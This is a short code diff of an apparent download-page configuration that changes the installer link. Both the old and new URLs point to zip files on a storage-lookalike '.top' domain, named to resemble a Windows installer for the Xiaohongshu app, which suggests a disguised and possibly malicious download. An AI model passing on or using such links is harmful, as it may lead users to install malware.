@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://s3trrreow-s3-oss.top/winer.xingin.xhs_2300200000_installer.zip", 
+    downloadUrl: "https://s3trrreow-s3-oss.top/Coupt_win7-11_Dcpxhs_x86_v50032.021.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
